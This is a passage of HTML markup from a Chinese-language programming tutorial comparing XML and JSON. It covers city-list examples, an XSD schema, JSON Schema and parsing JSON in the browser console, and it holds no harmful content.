data-offset-key="2399:0" data-first-offset="true"><span data-slate-string="true"> &lt;/city&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2400"> <span data-slate-object="text" data-key="2401"><span data-slate-leaf="true" 
data-offset-key="2401:0" data-first-offset="true"><span data-slate-string="true"> &lt;city&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2402"> <span data-slate-object="text" data-key="2403"><span data-slate-leaf="true" 
data-offset-key="2403:0" data-first-offset="true"><span data-slate-string="true"> &lt;name&gt;Shanghai&lt;/name&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2404"> <span data-slate-object="text" data-key="2405"><span data-slate-leaf="true" 
data-offset-key="2405:0" data-first-offset="true"><span data-slate-string="true"> &lt;id&gt;2&lt;/id&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2406"> <span data-slate-object="text" data-key="2407"><span data-slate-leaf="true" 
data-offset-key="2407:0" data-first-offset="true"><span data-slate-string="true"> &lt;/city&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2408"> <span data-slate-object="text" data-key="2409"><span data-slate-leaf="true" 
data-offset-key="2409:0" data-first-offset="true"><span data-slate-string="true">&lt;/cities&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-0f566022 " data-slate-type="paragraph" data-slate-object="block" data-key="2410"> 
<span data-slate-object="text" data-key="2411"><span data-slate-leaf="true" data-offset-key="2411:0" 
data-first-offset="true"><span data-slate-string="true">如果使用 JSON 的话，由于对于数组可以使用中括号直接支持，而不需要显式写出上例中的 
city 这个 tag 的名称，请你同样建立 cities.json：</span></span></span> </div> <div class="se-ca37e3ec se-0536a6f4" 
data-slate-type="pre" data-slate-object="block" data-key="2412" data-code-language="javascript"> 
<div class="se-c9323ff7 se-2cd2ca3f"> <span></span> </div> <div class="se-f31ac3bc"> <div class="se-f2022f5f 
se-fc56b9bb" data-code-line-number="1"></div> <div class="se-f2022f5f se-fc56b9bb" data-code-line-number="2"></div> 
<div class="se-f2022f5f se-fc56b9bb" data-code-line-number="3"></div> <div class="se-f2022f5f 
se-fc56b9bb" data-code-line-number="4"></div> <div class="se-f2022f5f se-fc56b9bb" data-code-line-number="5"></div> 
<div class="se-f2022f5f se-fc56b9bb" data-code-line-number="6"></div> </div> <div class="se-8f7af4f1 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2413"> <span data-slate-object="text" data-key="2414"><span data-slate-leaf="true" 
data-offset-key="2414:0" data-first-offset="true"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2415"> <span data-slate-object="text" data-key="2416"><span data-slate-leaf="true" 
data-offset-key="2416:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2416:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_2758987074" data-annotation-type="annotation"><span data-slate-string="true">"cities"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2416:2"><span data-slate-string="true">: [</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2417"> <span data-slate-object="text" data-key="2418"><span data-slate-leaf="true" 
data-offset-key="2418:0" data-first-offset="true"><span data-slate-string="true"> {</span></span><span 
data-slate-leaf="true" data-offset-key="2418:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_9427950515" data-annotation-type="annotation"><span data-slate-string="true">"name"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2418:2"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2418:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_8760816188" data-annotation-type="annotation"><span data-slate-string="true">"Beijing"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2418:4"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="2418:5"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_7157179966" data-annotation-type="annotation"><span data-slate-string="true">"id"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2418:6"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2418:7"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9529519029" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="2418:8"><span data-slate-string="true">},</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2419"> <span data-slate-object="text" data-key="2420"><span data-slate-leaf="true" 
data-offset-key="2420:0" data-first-offset="true"><span data-slate-string="true"> {</span></span><span 
data-slate-leaf="true" data-offset-key="2420:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6546540780" data-annotation-type="annotation"><span data-slate-string="true">"name"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2420:2"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2420:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_2184700358" data-annotation-type="annotation"><span data-slate-string="true">"Shanghai"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2420:4"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="2420:5"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_1622943372" data-annotation-type="annotation"><span data-slate-string="true">"id"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2420:6"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2420:7"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4198867663" data-annotation-type="annotation"><span data-slate-string="true">2</span></span></span><span 
data-slate-leaf="true" data-offset-key="2420:8"><span data-slate-string="true">}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2421"> <span data-slate-object="text" data-key="2422"><span data-slate-leaf="true" 
data-offset-key="2422:0" data-first-offset="true"><span data-slate-string="true"> ]</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2423"> <span data-slate-object="text" data-key="2424"><span data-slate-leaf="true" 
data-offset-key="2424:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-e90ba8fb " data-slate-type="paragraph" data-slate-object="block" data-key="2425"> 
<span data-slate-object="text" data-key="2426"><span data-slate-leaf="true" data-offset-key="2426:0" 
data-first-offset="true"><span data-slate-string="true">从这就可以看出，在这种情况下，JSON 似乎确实要更为简洁一些。上例中 
JSON 能够使用中括号直接表示数组，能够直接支持数值、字符串和布尔型的表示。</span></span></span> </div> <div class="se-13ac52c0 
" data-slate-type="paragraph" data-slate-object="block" data-key="2427"> <span data-slate-object="text" 
data-key="2428"><span data-slate-leaf="true" data-offset-key="2428:0" data-first-offset="true"><span 
data-slate-string="true">等等，这样说的话，JSON 因为能够直接支持数值的表示，这个 id 没有双引号修饰，就是数值类型，可是从 XML 中并不能看出这一点啊。因此，从这个角度说，应该是 
JSON 更严谨啊！那为什么说 XML 更严谨，严谨在哪呢？</span></span></span> </div> <div class="se-6c6e9c6b " data-slate-type="paragraph" 
data-slate-object="block" data-key="2429"> <span data-slate-object="text" data-key="2430"><span 
data-slate-leaf="true" data-offset-key="2430:0" data-first-offset="true"><span data-slate-string="true">有些程序员朋友可能会马上想到，XML 
是可以定义 tag 属性的，预定义一个 type 不就好了？</span></span></span> </div> <div class="se-5fe6f896 se-27cd7b42" 
data-slate-type="pre" data-slate-object="block" data-key="2431" data-code-language="cpp"> <div 
class="se-ec3809bb se-d31eec27"> <span></span> </div> <div class="se-8b1635a2"> <div class="se-bc799576 
se-2d42f6f9" data-code-line-number="1"></div> <div class="se-bc799576 se-2d42f6f9" data-code-line-number="2"></div> 
<div class="se-bc799576 se-2d42f6f9" data-code-line-number="3"></div> <div class="se-bc799576 
se-2d42f6f9" data-code-line-number="4"></div> </div> <div class="se-6a37455c ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2432"> <span data-slate-object="text" 
data-key="2433"><span data-slate-leaf="true" data-offset-key="2433:0" data-first-offset="true"><span 
data-slate-string="true">&lt;city&gt;</span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="2434"> <span data-slate-object="text" 
data-key="2435"><span data-slate-leaf="true" data-offset-key="2435:0" data-first-offset="true"><span 
data-slate-string="true"> &lt;name type=</span></span><span data-slate-leaf="true" data-offset-key="2435:1"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_7380630268" 
data-annotation-type="annotation"><span data-slate-string="true">"String"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2435:2"><span data-slate-string="true">&gt;Beijing&lt;/name&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2436"> <span data-slate-object="text" data-key="2437"><span data-slate-leaf="true" 
data-offset-key="2437:0" data-first-offset="true"><span data-slate-string="true"> &lt;id type=</span></span><span 
data-slate-leaf="true" data-offset-key="2437:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6209857702" data-annotation-type="annotation"><span data-slate-string="true">"number"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2437:2"><span data-slate-string="true">&gt;</span></span><span 
data-slate-leaf="true" data-offset-key="2437:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4938252708" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="2437:4"><span data-slate-string="true">&lt;id&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2438"> <span data-slate-object="text" data-key="2439"><span data-slate-leaf="true" 
data-offset-key="2439:0" data-first-offset="true"><span data-slate-string="true">&lt;/city&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-531f63e8 " data-slate-type="paragraph" data-slate-object="block" data-key="2440"> 
<span data-slate-object="text" data-key="2441"><span data-slate-leaf="true" data-offset-key="2441:0" 
data-first-offset="true"><span data-slate-string="true">看起来也能达到“严谨”的目的，可这很可能就是一个不好的实践了，因为 XML 
对于这些常见的数据类型，内置了直接的支持。我们可以通过定义 XML Schema Definition（XSD）来对 XML 的结构做出明确的要求，也就是说，我们不必自己去造轮子，来定义并实现这个 
type 属性。针对上面的 cities.xml，我们可以定义这样的 XSD：</span></span></span> </div> <div class="se-635065b4 
se-493a5c48" data-slate-type="pre" data-slate-object="block" data-key="2442" data-code-language="cpp"> 
<div class="se-9d7fe9b9 se-08d8d693"> <span></span> </div> <div class="se-65c62715"> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="1"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="2"></div> 
<div class="se-fe53107b se-7c4ef22e" data-code-line-number="3"></div> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="4"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="5"></div> 
<div class="se-fe53107b se-7c4ef22e" data-code-line-number="6"></div> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="7"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="8"></div> 
<div class="se-fe53107b se-7c4ef22e" data-code-line-number="9"></div> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="10"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="11"></div> 
<div class="se-fe53107b se-7c4ef22e" data-code-line-number="12"></div> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="13"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="14"></div> 
<div class="se-fe53107b se-7c4ef22e" data-code-line-number="15"></div> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="16"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="17"></div> 
</div> <div class="se-e98a8f8e ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2443"> <span data-slate-object="text" data-key="2444"><span 
data-slate-leaf="true" data-offset-key="2444:0" data-first-offset="true"><span data-slate-string="true">&lt;?xml 
version=</span></span><span data-slate-leaf="true" data-offset-key="2444:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_3824263888" data-annotation-type="annotation"><span 
data-slate-string="true">"1.0"</span></span></span><span data-slate-leaf="true" data-offset-key="2444:2"><span 
data-slate-string="true"> encoding=</span></span><span data-slate-leaf="true" data-offset-key="2444:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_2474668975" 
data-annotation-type="annotation"><span data-slate-string="true">"UTF-8"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2444:4"><span data-slate-string="true"> ?&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2445"> <span data-slate-object="text" data-key="2446"><span data-slate-leaf="true" 
data-offset-key="2446:0" data-first-offset="true"><span data-slate-string="true">&lt;xs:schema 
xmlns:xs=</span></span><span data-slate-leaf="true" data-offset-key="2446:1"><span class=" 
gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_4605738392" data-annotation-type="annotation"><span 
data-slate-string="true">"http://www.w3.org/2001/XMLSchema"</span></span></span><span data-slate-leaf="true" 
data-offset-key="2446:2"><span data-slate-string="true">&gt;</span></span></span> </div> <div 
class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2447"> 
<span data-slate-object="text" data-key="2448"><span data-slate-leaf="true" data-offset-key="2448:0" 
data-first-offset="true"><span data-slate-string="true"> &lt;xs:element name=</span></span><span 
data-slate-leaf="true" data-offset-key="2448:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_7386581326" data-annotation-type="annotation"><span data-slate-string="true">"cities"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2448:2"><span data-slate-string="true">&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2449"> <span data-slate-object="text" data-key="2450"><span data-slate-leaf="true" 
data-offset-key="2450:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:complexType&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2451"> <span data-slate-object="text" data-key="2452"><span data-slate-leaf="true" 
data-offset-key="2452:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:sequence&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2453"> <span data-slate-object="text" data-key="2454"><span data-slate-leaf="true" 
data-offset-key="2454:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:element 
name=</span></span><span data-slate-leaf="true" data-offset-key="2454:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_0682870979" data-annotation-type="annotation"><span 
data-slate-string="true">"city"</span></span></span><span data-slate-leaf="true" data-offset-key="2454:2"><span 
data-slate-string="true"> maxOccurs=</span></span><span data-slate-leaf="true" data-offset-key="2454:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_8721632418" 
data-annotation-type="annotation"><span data-slate-string="true">"unbounded"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2454:4"><span data-slate-string="true"> minOccurs=</span></span><span 
data-slate-leaf="true" data-offset-key="2454:5"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_2610401564" data-annotation-type="annotation"><span data-slate-string="true">"0"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2454:6"><span data-slate-string="true">&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2455"> <span data-slate-object="text" data-key="2456"><span data-slate-leaf="true" 
data-offset-key="2456:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:complexType&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2457"> <span data-slate-object="text" data-key="2458"><span data-slate-leaf="true" 
data-offset-key="2458:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:sequence&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2459"> <span data-slate-object="text" data-key="2460"><span data-slate-leaf="true" 
data-offset-key="2460:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:element 
type=</span></span><span data-slate-leaf="true" data-offset-key="2460:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_1828138474" data-annotation-type="annotation"><span 
data-slate-string="true">"xs:string"</span></span></span><span data-slate-leaf="true" data-offset-key="2460:2"><span 
data-slate-string="true"> name=</span></span><span data-slate-leaf="true" data-offset-key="2460:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_2814107281" 
data-annotation-type="annotation"><span data-slate-string="true">"name"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2460:4"><span data-slate-string="true">/&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2461"> <span data-slate-object="text" data-key="2462"><span data-slate-leaf="true" 
data-offset-key="2462:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:element 
type=</span></span><span data-slate-leaf="true" data-offset-key="2462:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_2686562872" data-annotation-type="annotation"><span 
data-slate-string="true">"xs:byte"</span></span></span><span data-slate-leaf="true" data-offset-key="2462:2"><span 
data-slate-string="true"> name=</span></span><span data-slate-leaf="true" data-offset-key="2462:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_3679947391" 
data-annotation-type="annotation"><span data-slate-string="true">"id"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2462:4"><span data-slate-string="true">/&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2463"> <span data-slate-object="text" data-key="2464"><span data-slate-leaf="true" 
data-offset-key="2464:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:sequence&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2465"> <span data-slate-object="text" data-key="2466"><span data-slate-leaf="true" 
data-offset-key="2466:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:complexType&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2467"> <span data-slate-object="text" data-key="2468"><span data-slate-leaf="true" 
data-offset-key="2468:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:element&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2469"> <span data-slate-object="text" data-key="2470"><span data-slate-leaf="true" 
data-offset-key="2470:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:sequence&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2471"> <span data-slate-object="text" data-key="2472"><span data-slate-leaf="true" 
data-offset-key="2472:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:complexType&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2473"> <span data-slate-object="text" data-key="2474"><span data-slate-leaf="true" 
data-offset-key="2474:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:element&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2475"> <span data-slate-object="text" data-key="2476"><span data-slate-leaf="true" 
data-offset-key="2476:0" data-first-offset="true"><span data-slate-string="true">&lt;/xs:schema&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 251px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-303bfd4e " data-slate-type="paragraph" data-slate-object="block" 
data-key="2477"> <span data-slate-object="text" data-key="2478"><span data-slate-leaf="true" 
data-offset-key="2478:0" data-first-offset="true"><span data-slate-string="true">这样一来，我们就对 
cities 和 city 这两个 tag 做了严格的内容限定，包括包含的子节点有哪些，顺序如何，取值类型是什么等等。在实际的 XML 定义中，我们可以引用这个 XSD，这样 XML 
的处理程序就会加载这个 XSD 并根据 schema 的规则对 XML 进行校验，从而发现 XML 不合要求的问题。</span></span></span> </div> <div 
class="se-134fd1f0 " data-slate-type="paragraph" data-slate-object="block" data-key="2479"> 
<span data-slate-object="text" data-key="2480"><span data-slate-leaf="true" data-offset-key="2480:0" 
data-first-offset="true"><span data-slate-string="true">进一步地，你可以自己动动手，看一下</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2481" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2482"><span data-slate-leaf="true" data-offset-key="2482:0" 
data-first-offset="true"><span data-slate-string="true">这个工具</span></span></span></a><span 
data-slate-object="text" data-key="2483"><span data-slate-leaf="true" data-offset-key="2483:0" 
data-first-offset="true"><span data-slate-string="true">，它可以帮助你通过 XML 快速生成样例 XSD；而</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2484" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2485"><span data-slate-leaf="true" data-offset-key="2485:0" 
data-first-offset="true"><span data-slate-string="true">这个工具</span></span></span></a><span 
data-slate-object="text" data-key="2486"><span data-slate-leaf="true" data-offset-key="2486:0" 
data-first-offset="true"><span data-slate-string="true">则可以帮你快速验证 XML 是不是满足某 XSD 的要求，它们都很有用。</span></span></span> 
</div> <div class="se-743bd3c0 " data-slate-type="paragraph" data-slate-object="block" data-key="2487"> 
<span data-slate-object="text" data-key="2488"><span data-slate-leaf="true" data-offset-key="2488:0" 
data-first-offset="true"><span data-slate-string="true">补充一下，你可能也听说过，或使用过类似的叫做 DTD，也就是 Document 
Type Definition 的方式，能想到这个很好，但是 XSD 相对来说有着更大的优势，并成为了 W3C 的标准。因此我在这里不提 DTD，但是我在扩展阅读中放了关于 XSD 
和 DTD 的比较材料，供感兴趣的朋友拓展。</span></span></span> </div> <div class="se-5a437eb8 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2489"> <span data-slate-object="text" data-key="2490"><span 
data-slate-leaf="true" data-offset-key="2490:0" data-first-offset="true"><span data-slate-string="true">我想，从 
XSD 你应该可以体会到 XML 的严谨性了。那喜爱使用 JSON 的程序员，就不能创造一个类似的东西，来填补这个坑——即定义和保证 JSON 的严谨性吗？</span></span></span> 
</div> <div class="se-a23e74ce " data-slate-type="paragraph" data-slate-object="block" data-key="2491"> 
<span data-slate-object="text" data-key="2492"><span data-slate-leaf="true" data-offset-key="2492:0" 
data-first-offset="true"><span data-slate-string="true">有，它就是 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2493" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="2494"><span data-slate-leaf="true" data-offset-key="2494:0" data-first-offset="true"><span 
data-slate-string="true">JSON Schema</span></span></span></a><span data-slate-object="text" 
data-key="2495"><span data-slate-leaf="true" data-offset-key="2495:0" data-first-offset="true"><span 
data-slate-string="true">，也许你已经在项目中使用了，但是还没有统一成标准，也没有被足够广泛地接纳，因此我就不展开来说了。你可以自己实践一下，把上面提到的 JSON 
填写到这个 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2496" 
class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="2497"><span data-slate-leaf="true" 
data-offset-key="2497:0" data-first-offset="true"><span data-slate-string="true">JSON Schema 
推断工具</span></span></span></a><span data-slate-object="text" data-key="2498"><span data-slate-leaf="true" 
data-offset-key="2498:0" data-first-offset="true"><span data-slate-string="true">上面，去看看生成的 
JSON Schema 样例。</span></span></span> </div> <h3 class="se-cf102ea0" data-slate-type="heading" 
data-slate-object="block" data-key="2499"><span data-slate-object="text" data-key="2500"><span 
data-slate-leaf="true" data-offset-key="2500:0" data-first-offset="true"><span data-slate-string="true">2. 
JavaScript 一家亲</span></span></span></h3> <div class="se-4079008b " data-slate-type="paragraph" 
data-slate-object="block" data-key="2501"> <span data-slate-object="text" data-key="2502"><span 
data-slate-leaf="true" data-offset-key="2502:0" data-first-offset="true"><span data-slate-string="true">对于全栈工程师来说，和 
XML 比较起来，JSON 对于前端开发来说，可以说有着不可比拟的亲和力。本来，JSON 就是 JavaScript 对象表示法，就是从 JavaScript 这个源头发展而来的，当然，JSON 
如今是不依赖于任何编程语言的。这个“一家亲”，首先表现在，JSON 和 JavaScript 对象之间的互相转化，可以说是轻而易举的。</span></span></span> </div> 
<div class="se-7e8756be " data-slate-type="paragraph" data-slate-object="block" data-key="2503"> 
<span data-slate-object="text" data-key="2504"><span data-slate-leaf="true" data-offset-key="2504:0" 
data-first-offset="true"><span data-slate-string="true">我们来动动手实践一下，打开 Chrome 的开发者工具，切换到 Console 
页，打开前面建立的 cities.json，拷贝其中的内容到一对反引号（backtick，就是键盘上 esc 下面的那个按键）中，并赋给变量 text：</span></span></span> 
</div> <div class="se-63cedb12 se-2d8750c4" data-slate-type="pre" data-slate-object="block" 
data-key="2505" data-code-language="javascript"> <div class="se-7d4e2d28 se-5275b739"> <span></span> 
</div> <div class="se-77830f8b"> <div class="se-63c30b00 se-83ca1c44" data-code-line-number="1"></div> 
</div> <div class="se-1560ad1f ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2506"> <span data-slate-object="text" data-key="2507"><span 
data-slate-leaf="true" data-offset-key="2507:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8428148751" data-annotation-type="annotation"><span 
data-slate-string="true">var</span></span></span><span data-slate-leaf="true" data-offset-key="2507:1"><span 
data-slate-string="true"> text = </span></span><span data-slate-leaf="true" data-offset-key="2507:2"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_9553134829" 
data-annotation-type="annotation"><span data-slate-string="true">`JSON 字符串`</span></span></span><span 
data-slate-leaf="true" data-offset-key="2507:3"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-731cabc0 " data-slate-type="paragraph" data-slate-object="block" data-key="2508"> 
<span data-slate-object="text" data-key="2509"><span data-slate-leaf="true" data-offset-key="2509:0" 
data-first-offset="true"><span data-slate-string="true">我们很轻松地就可以把它转化为 JavaScript 对象（反序列化），不需要任何第三方的 
parser：</span></span></span> </div> <div class="se-81956133 se-3761ba0b" data-slate-type="pre" 
data-slate-object="block" data-key="2510" data-code-language="javascript"> <div class="se-ceb2aff8 
se-c4cd95cf"> <span></span> </div> <div class="se-443d136b"> <div class="se-d01768fa se-4b692935" 
data-code-line-number="1"></div> </div> <div class="se-9deacf45 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2511"> <span data-slate-object="text" 
data-key="2512"><span data-slate-leaf="true" data-offset-key="2512:0" data-first-offset="true"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_2643313262" 
data-annotation-type="annotation"><span data-slate-string="true">var</span></span></span><span 
data-slate-leaf="true" data-offset-key="2512:1"><span data-slate-string="true"> obj = </span></span><span 
data-slate-leaf="true" data-offset-key="2512:2"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_0299221015" data-annotation-type="annotation"><span data-slate-string="true">JSON</span></span></span><span 
data-slate-leaf="true" data-offset-key="2512:3"><span data-slate-string="true">.parse(text);</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
